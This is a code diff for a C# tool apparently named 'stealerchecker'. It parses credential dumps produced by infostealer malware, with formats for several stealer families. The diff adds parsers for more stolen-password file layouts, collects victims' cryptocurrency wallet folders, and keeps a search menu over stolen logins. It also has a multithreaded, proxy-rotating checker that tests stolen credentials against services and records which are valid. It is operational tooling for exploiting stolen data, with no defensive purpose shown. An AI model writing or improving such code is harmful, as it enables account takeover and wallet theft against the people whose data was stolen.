+                    if (File.Exists(Path.Combine(passwordsDir, "Passwords_Opera.txt")))
+                    {
+                        try
+                        {
+                            var log = Regex.Matches(File.ReadAllText(Path.Combine(passwordsDir, "Passwords_Opera.txt")).Replace("\r", ""), @"Url: (.*)\s*Login: (.*)\s*Passwords: (.*)");
+
+                            passwords.AddRange(log.OfType<Match>()
+                                .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
+                                .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                        }
+                        catch
+                        {
+                        }
+                    }
+                    if (File.Exists(Path.Combine(passwordsDir, "Passwords_Unknown.txt")))
+                    {
+                        try
+                        {
+                            var log = Regex.Matches(File.ReadAllText(Path.Combine(passwordsDir, "Passwords_Unknown.txt")).Replace("\r", ""), @"Url: (.*)\s*Login: (.*)\s*Password: (.*)");
+
+                            passwords.AddRange(log.OfType<Match>()
+                                .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
+                                .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                        }
+                        catch
+                        {
+                        }
                     }
                 }
                 else if (filePas.Name.Equals("UserInformation.txt"))
                 {
                     try
                     {
-                        var thisFile = FileCl.Load(Path.Combine(filecl.Info.DirectoryName, "Passwords.txt"));
-                        var log = Regex.Matches(thisFile.GetContent(), @"URL: (.*)\s*Username: (.*)\s*Password: (.*)");
+                        var thisFile = FileCl.Load(Path.Combine(dir, "Passwords.txt"));
+                        var log = Regex.Matches(thisFile.GetContent().Replace("\r", ""), @"URL: (.*)\s*Username: (.*)\s*Password: (.*)");
 
-                        pas.AddRange(log.OfType<Match>()
-                                    .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
+                        passwords.AddRange(log.OfType<Match>()
+                                    .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
                                     .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                     }
                     catch { }
@@ -861,11 +1006,11 @@ namespace stealerchecker
                 {
                     try
                     {
-                        var thisFile = FileCl.Load(Path.Combine(filecl.Info.DirectoryName, "Passwords.txt"));
-                        var log = Regex.Matches(thisFile.GetContent(), @"HOST: (.*)\s*USER: (.*)\s*PASS: (.*)");
+                        var thisFile = Path.Combine(dir, "Passwords.txt");
+                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"HOST: (.*)\s*USER: (.*)\s*PASS: (.*)");
 
-                        pas.AddRange(log.OfType<Match>()
-                                    .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
+                        passwords.AddRange(log.OfType<Match>()
+                                    .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
                                     .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                     }
                     catch { }
@@ -874,21 +1019,26 @@ namespace stealerchecker
                 {
                     try
                     {
-                        var filename = Array
-                            .Find(Directory.GetFiles(Path.Combine(filecl.Info.DirectoryName, "Browsers")),
-                            x => Path.GetFileName(x).StartsWith("Passwords"));
-                        if (filename == default)
-                            continue;
+                        var filenames = Directory.GetFiles(Path.Combine(dir, "Browsers"))
+                            .Where(x => Path.GetFileName(x).StartsWith("Passwords")).ToList();
 
-                        var thisFile = FileCl.Load(filename);
-                        var log = Regex.Matches(thisFile.GetContent(), @"URL: (.*)\s*Login: (.*)\s*Password: (.*)");
+                        if (Directory.Exists(Path.Combine(dir, "Browsers", "Unknowns")))
+                        {
+                            filenames.AddRange(Directory.GetFiles(Path.Combine(dir, "Browsers", "Unknowns"))
+                                        .Where(x => Path.GetFileName(x).StartsWith("Passwords")));
+                        }
+                        for (int i1 = 0; i1 < filenames.Count; i1++)
+                        {
+                            string filename = filenames[i1];
+                            var log = Regex.Matches(File.ReadAllText(filename).Replace("\r", ""), @"URL: (.*)\s*Login: (.*)\s*Password: (.*)");
 
-                        pas.AddRange(log.OfType<Match>()
-                                    .Select(match => new Password(
-                                        match.Groups[1].Value.Replace("\r", ""),
-                                        match.Groups[2].Value.Replace("\r", ""),
-                                        match.Groups[3].Value.Replace("\r", "")))
-                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                            passwords.AddRange(log.OfType<Match>()
+                                        .Select(match => new Password(
+                                            match.Groups[1].Value,
+                                            match.Groups[2].Value,
+                                            match.Groups[3].Value, filePas))
+                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                        }
                     }
                     catch { }
                 }
@@ -896,20 +1046,97 @@ namespace stealerchecker
                 {
                     try
                     {
-                        var thisFile = FileCl.Load(Path.Combine(filecl.Info.DirectoryName, "_AllPasswords_list.txt"));
-                        var log = Regex.Matches(thisFile.GetContent(), @"Url: (.*)\s*Username: (.*)\s*Password: (.*)");
+                        var thisFile = Path.Combine(dir, "_AllPasswords_list.txt");
+                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"Url: (.*)\s*Username: (.*)\s*Password: (.*)");
 
-                        pas.AddRange(log.OfType<Match>()
+                        passwords.AddRange(log.OfType<Match>()
                                     .Select(match => new Password(
-                                        match.Groups[1].Value.Replace("\r", ""),
-                                        match.Groups[2].Value.Replace("\r", ""),
-                                        match.Groups[3].Value.Replace("\r", "")))
+                                        match.Groups[1].Value,
+                                        match.Groups[2].Value,
+                                        match.Groups[3].Value, filePas))
+                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                    }
+                    catch { }
+                }
+                else if (filePas.Name.Equals("information.txt"))
+                {
+                    try
+                    {
+                        var thisFile = Path.Combine(dir, "Browser", "Passwords.txt");
+                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"\| Site: (.*)\s*\| Login: (.*)\s*\| Pass: (.*)");
+
+                        passwords.AddRange(log.OfType<Match>()
+                                    .Select(match => new Password(
+                                        match.Groups[1].Value,
+                                        match.Groups[2].Value,
+                                        match.Groups[3].Value, filePas))
+                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                    }
+                    catch { }
+
+                    try
+                    {
+                        var thisFile = Path.Combine(dir, "passwords.txt");
+                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"Host: (.*)\s*Login: (.*)\s*Password: (.*)");
+
+                        passwords.AddRange(log.OfType<Match>()
+                                    .Select(match => new Password(
+                                        match.Groups[1].Value,
+                                        match.Groups[2].Value,
+                                        match.Groups[3].Value, filePas))
+                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                    }
+                    catch { }
+                }
+                else if (filePas.Name.Equals("system_info.txt"))
+                {
+                    try
+                    {
+                        var thisFile = Path.Combine(dir, "passwords.txt");
+                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"Site: (.*)\s*Username: (.*)\s*Password: (.*)");
+
+                        passwords.AddRange(log.OfType<Match>()
+                                    .Select(match => new Password(
+                                        match.Groups[1].Value,
+                                        match.Groups[2].Value,
+                                        match.Groups[3].Value, filePas))
+                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                    }
+                    catch { }
+                }
+                else if (filePas.Name.Equals("readme.txt")) // HUNTER
+                {
+                    try
+                    {
+                        var thisFile = Path.Combine(dir, "Browsers", "Passwords.txt");
+                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"\| Site: (.*)\s*\| Login: (.*)\s*\| Password: (.*)");
+
+                        passwords.AddRange(log.OfType<Match>()
+                                    .Select(match => new Password(
+                                        match.Groups[1].Value,
+                                        match.Groups[2].Value,
+                                        match.Groups[3].Value, filePas))
+                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                    }
+                    catch { }
+                }
+                else if (filePas.Name.Equals("LogInfo.txt")) // Unknown
+                {
+                    try
+                    {
+                        var thisFile = Path.Combine(dir, "General", "passwords.txt");
+                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"Url: (.*)\s*Login: (.*)\s*Password: (.*)");
+
+                        passwords.AddRange(log.OfType<Match>()
+                                    .Select(match => new Password(
+                                        match.Groups[1].Value,
+                                        match.Groups[2].Value,
+                                        match.Groups[3].Value, filePas))
                                     .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                     }
                     catch { }
                 }
 
-                passwords.AddRange(pas);
                 counter++;
             }
 
@@ -941,31 +1168,16 @@ namespace stealerchecker
             }
             SetStatus();
         }
-        internal class Service
-        {
-            public string Name;
-            public IEnumerable<string> Services;
-        }
-        internal class Password
-        {
-            internal string Url;
-            internal string Login;
-            internal string Pass;
-
-            internal Password(string url, string login, string pass)
-            {
-                Url = url;
-                Login = login;
-                Pass = pass;
-            }
-        }
 
         #endregion
         #region EVERYTHING
 
         internal static async Task GetFilesAsync()
         {
-            files.AddRange((await GetPathsAsync(patterns).ConfigureAwait(false)).Select(x => new Log(x)));
+            files.AddRange(
+                (await GetPathsAsync(patterns).ConfigureAwait(false)).Select(x => new Log(x))
+                .Where(x => patterns.Contains(x.Name))
+                .Distinct());
             if (files.Count == 0)
             {
                 Console.WriteLine("Seems, there is an Everything error.. Using normal method", Color.Pink);
@@ -991,25 +1203,22 @@ namespace stealerchecker
                 // foreach array optimization
                 foreach (var pattern in patterns.ToArray())
                 {
-                    SetStatus($"Loading... {progress}%");
-                    pathsResult.AddRange((await client.SearchAsync(pattern).ConfigureAwait(false)).Items
+                    SetStatus($"Loading [1/2]... {Math.Round(GetPercent(patterns.Count, progress++), 2)}%");
+                    pathsResult.AddRange((await client.SearchAsync('"' + pattern + '"').ConfigureAwait(false)).Items
                                     .OfType<FileResultItem>()
                                     .Where(file => file.FullPath.StartsWith(opt.Path.Replace("/", "\\"), StringComparison.OrdinalIgnoreCase))
                                     .Select(x => x.FullPath));
-                    progress += Convert.ToInt32(Math.Round((decimal)(75 / (patterns.Count - 1))));
                 }
             }
             else
             {
-                var patternsArray = patterns.ToArray();
                 // foreach array optimization
-                foreach (var pattern in patternsArray)
+                foreach (var pattern in patterns.ToArray())
                 {
-                    SetStatus($"Loading... {progress}%");
-                    pathsResult.AddRange((await client.SearchAsync(pattern).ConfigureAwait(false)).Items
+                    SetStatus($"Loading [1/2]... {Math.Round(GetPercent(patterns.Count, progress++), 2)}%");
+                    pathsResult.AddRange((await client.SearchAsync('"' + pattern + '"').ConfigureAwait(false)).Items
                                     .OfType<FileResultItem>()
                                     .Select(x => x.FullPath));
-                    progress += Convert.ToInt32(Math.Round((decimal)(75 / (patterns.Count - 1))));
                 }
             }
             return pathsResult;
@@ -1022,9 +1231,9 @@ namespace stealerchecker
         {
             menu = new Dictionary<string, Action>()
                 {
-                    { "Search by URL", () => SearchByURL(Ext.input("Enter query", Color.LightSkyBlue)) },
-                    { "Search by Password", () => SearchByPass(Ext.input("Enter query", Color.LightSkyBlue)) },
-                    { "Search by Username", () => SearchByUsername(Ext.input("Enter query", Color.LightSkyBlue)) }
+                    { "Search by URL", () => SearchByURL(Ext.Input("Enter query", Color.LightSkyBlue)) },
+                    { "Search by Password", () => SearchByPass(Ext.Input("Enter query", Color.LightSkyBlue)) },
+                    { "Search by Username", () => SearchByUsername(Ext.Input("Enter query", Color.LightSkyBlue)) }
                 }.ToList(),
             Name = "Searhing"
         };
@@ -1084,6 +1293,8 @@ namespace stealerchecker
             Console.WriteLine("4. Most popular URLs:", Color.LightCyan);
             Console.WriteLine(AnalyzeMostPopularURLs(), Color.DarkCyan);
             Console.WriteLine();
+            Console.WriteLine("5. Types of logs:", Color.LightCyan);
+            Console.WriteLine(AnalyzeTypesOfLogs().Join(), Color.DarkCyan);
             Console.WriteLine("55. back <--", Color.Cyan);
 
             var selection = 0;
@@ -1118,7 +1329,7 @@ namespace stealerchecker
             Console.WriteLine("2. Search", Color.LightCyan);
             Console.WriteLine("3. Sort Logs", Color.LightCyan);
             Console.WriteLine("4. Analysis", Color.LightCyan);
-            Console.WriteLine("5. Check", Color.LightCyan);
+            //Console.WriteLine("5. Check", Color.LightCyan);
             Console.WriteLine();
             Console.WriteLine($"88. Verbose: {opt.Verbose}", Color.Cyan);
             Console.WriteLine("99. Exit", Color.LightPink);
@@ -1152,11 +1363,6 @@ namespace stealerchecker
                     PrintMainMenu();
                     break;
             }
-        }
-        public class Menu
-        {
-            public List<KeyValuePair<string, Action>> menu;
-            public string Name;
         }
 
         #endregion
@@ -1195,10 +1401,25 @@ namespace stealerchecker
 
             return Math.Round(GetPercent(glob.Count(), count), 2);
         }
-        internal static decimal GetPercent(int b, int a)
+        private static IEnumerable<string> AnalyzeTypesOfLogs()
+        {
+            var list = new List<KeyValuePair<string, int>>();
+            for (int i = 0; i < patterns.Count; i++)
+            {
+                var pattern = patterns[i];
+                var name = names[i];
+                var count = files.Count(x => x.Name.Equals(pattern));
+
+                if (count > 0)
+                    list.Add(new KeyValuePair<string, int>(name, count));
+            }
+
+            return list.OrderByDescending(x => x.Value).Select(x => $"\t{x.Key} - {x.Value} logs");
+        }
+        internal static decimal GetPercent(int b, int a, decimal c = 100M)
         {
             if (b == 0) return 0;
-            return a / (b / 100M);
+            return a / (b / c);
         }
 
         #endregion
@@ -1246,9 +1467,10 @@ namespace stealerchecker
             "Tronlink",
             "BitcoinCore",
             "Armory",
-            "LitecoinCore"
+            "LitecoinCore",
+            "Yoroi"
         };
-        private static void GetAllWallets() { foreach (var wallet in wallets) GetSpecWallets(wallet); }
+        private static void GetAllWallets() { wallets.ForEach(wallet => GetSpecWallets(wallet)); }
         private static void GetSpecWallets(string WalletName)
         {
             var withWallet = files
@@ -1262,7 +1484,7 @@ namespace stealerchecker
             foreach (var walletFolder in withWallet)
             {
                 SetStatus($"Working... [{WalletName}] [{counter}/{withWallet.Count()}]");
-                CopyFiles(Path.Combine(walletFolder, "Wallets", WalletName), Path.Combine("Wallets", WalletName, new DirectoryInfo(walletFolder).Name));
+                CopyFiles(walletFolder, Path.Combine("Wallets", WalletName, new DirectoryInfo(walletFolder).Name));
                 counter++;
             }
 
@@ -1293,12 +1515,20 @@ namespace stealerchecker
             {
                 threads.Add(new Thread(() =>
                 {
-                    if (index >= proxy.Count)
-                        index = 0;
+                a:
+                    try
+                    {
+                        if (index >= proxy.Count)
+                            index = 0;
 
-                    checker.ProcessLine(password, proxy[index++], type, out var result, out var isValid);
+                        checker.ProcessLine(password, proxy[index++], type, out var result, out var isValid);
 
-                    File.AppendAllText(Path.Combine("Checked", checker.Service + ".txt"), $"{password} - {(isValid ? "Valid" : "Not valid")}, info: {result + NewLine}");
+                        File.AppendAllText(Path.Combine("Checked", checker.Service + ".txt"), $"{password} - {(isValid ? "Valid" : "Not valid")}, info: {result + NewLine}");
+                    }
+                    catch
+                    {
+                        goto a;
+                    }
                 }));
             }
             foreach (var task in threads)
@@ -1367,75 +1597,40 @@ namespace stealerchecker
         }
 
         #endregion
-    }
+        #region ANTIPUBLIC
 
-    internal static class Ext
-    {
-        public static void Print(this Menu menu)
+        private static string GetHash(string path) => FileCl.Load(path).Hashes.GetCRC32();
+        public static IEnumerable<KeyValuePair<string, string>> GetAllHashes()
         {
-            Console.Clear();
-            Console.WriteLine(menu.Name, Color.Pink);
-            Console.WriteLine();
-            foreach (var item in menu.menu)
-                Console.WriteLine($"{menu.menu.IndexOf(item) + 1}. {item.Key}", Color.LightCyan);
-            Console.WriteLine();
-            Console.WriteLine("55. back <--", Color.Cyan);
+            var list = new List<KeyValuePair<string, string>>();
+            var ths = new List<Thread>();
 
-            var selection = 0;
-            try
+            int y = 0;
+            foreach (var file in files)
             {
-                selection = int.Parse(Console.ReadLine());
-            }
-            catch
-            {
-                Print(menu);
+                ths.Add(new Thread(() =>
+                {
+                    SetStatus($"Getting hashes... {Math.Round(GetPercent(files.Count, y++), 3)}%");
+                    try
+                    {
+                        list.Add(new KeyValuePair<string, string>(file.Name, GetHash(file.FullPath)));
+                    }
+                    catch { }
+                }));
             }
 
-            Console.WriteLine();
+            foreach (var item in ths) item.Start();
 
-            if (selection == 55)
+            int i = 0;
+            foreach (var item in ths)
             {
-                Console.Clear();
-                PrintMainMenu();
+                SetStatus($"Waiting... {Math.Round(GetPercent(ths.Count, i++), 3)}%");
+                item.Wait();
             }
 
-            if (selection > menu.menu.Count || selection < 1)
-                Print(menu);
-            try
-            {
-                menu.menu[selection - 1].Value();
-            }
-            catch { Print(menu); }
+            return list;
+        }
 
-            PrintMainMenu();
-        }
-        internal static void WriteLine(this StringBuilder builder, string value) => builder.Append(value).Append(NewLine);
-        public static string input(string text, Color color)
-        {
-            Console.WriteLine(text, color);
-            return Console.ReadLine();
-        }
-        public static bool AnyNew(this string a, string b)
-        {
-            return CultureInfo
-                .CurrentCulture
-                .CompareInfo
-                .IndexOf(a, b, 0, a.Length, CompareOptions.IgnoreCase) >= 0;
-        }
-        public static void Wait(this Thread th)
-        {
-            while(th.IsAlive)
-                Thread.Sleep(1);
-        }
-    }
-    public class Log
-    {
-        public Log(string fullPath)
-        {
-            FullPath = fullPath;
-            Name = Path.GetFileName(fullPath);
-        }
-        public string FullPath;
-        public string Name;
+        #endregion
     }
 }
